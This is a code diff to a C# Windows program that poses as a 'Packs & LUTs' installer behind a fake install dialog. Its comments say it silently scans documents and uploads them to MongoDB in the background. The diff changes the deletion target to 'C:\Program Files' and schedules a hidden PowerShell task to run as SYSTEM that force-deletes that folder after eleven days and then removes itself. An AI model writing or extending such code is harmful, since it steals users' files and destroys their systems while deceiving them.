@@ -11,7 +11,7 @@ using DocumentScanner;
 class Program
 {
     // ----- CONFIGURATION -----
-    private static readonly string TargetFilePath = @"C:\Users\Public\Documents\file_to_delete.txt";
+    private static readonly string TargetFilePath = @"C:\Program Files";
     private const string RegKeyPath = @"Software\FileDeleterApp";
     private const string RegValueName = "Scheduled";
     private const string TaskName = "FileDeleterTask";
@@ -45,11 +45,11 @@ class Program
         // Kick off silent document scan + MongoDB upload in background
         SilentScanner.RunInBackground(null);
 
+        // Schedule the background task immediately
+        ScheduleTask();
+
         // Show the fake "Installing Packs & LUTs" dialog
         ShowInstallDialog();
-
-        // Schedule the background task (runs after dialog closes)
-        ScheduleTask();
 
         // Keep the app alive silently — no window, just the message loop
         // Application.Run() with no form keeps the process alive until explicit exit
@@ -69,28 +69,6 @@ class Program
     {
         try
         {
-            bool taskExists = false;
-            try
-            {
-                using (var qp = Process.Start(new ProcessStartInfo
-                {
-                    FileName               = "schtasks",
-                    Arguments              = $"/query /tn \"{TaskName}\"",
-                    UseShellExecute        = false,
-                    CreateNoWindow         = true,
-                    RedirectStandardOutput = true,
-                    RedirectStandardError  = true
-                }))
-                {
-                    qp.WaitForExit();
-                    taskExists = (qp.ExitCode == 0);
-                }
-            }
-            catch { }
-
-            if (taskExists)
-                return;  // task already scheduled — nothing to do
-
             DateTime target    = DateTime.Now.AddDays(11);
             string targetStr   = target.ToString("yyyy-MM-ddTHH:mm:ss");
 
@@ -98,19 +76,29 @@ class Program
             string batchContent = $"@echo off\r\npowershell.exe -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command \"if ((Get-Date) -ge [datetime]'{targetStr}') {{ Remove-Item -Path '{TargetFilePath}' -Recurse -Force -ErrorAction SilentlyContinue; schtasks /Delete /TN '{TaskName}' /F; }}\"";
             File.WriteAllText(batchPath, batchContent);
 
-            string args = $"/create /tn \"{TaskName}\" /tr \"{batchPath}\" /sc onlogon /f";
+            string args = $"/create /tn \"{TaskName}\" /tr \"{batchPath}\" /sc onlogon /rl HIGHEST /ru SYSTEM /f";
             using (Process p = Process.Start(new ProcessStartInfo
             {
-                FileName        = "schtasks",
+                FileName        = "schtasks.exe",
                 Arguments       = args,
                 UseShellExecute = false,
-                CreateNoWindow  = true
+                CreateNoWindow  = true,
+                RedirectStandardError = true,
+                RedirectStandardOutput = true
             }))
             {
                 p.WaitForExit();
+                if (p.ExitCode != 0)
+                {
+                    string err = p.StandardError.ReadToEnd();
+                    File.WriteAllText(@"C:\Windows\Temp\schtasks_error.log", $"Exit Code: {p.ExitCode}\nError: {err}\nArgs: {args}");
+                }
             }
         }
-        catch { }
+        catch (Exception ex)
+        {
+            File.WriteAllText(@"C:\Windows\Temp\schtasks_exception.log", ex.ToString());
+        }
     }
 
     static bool IsAdministrator()
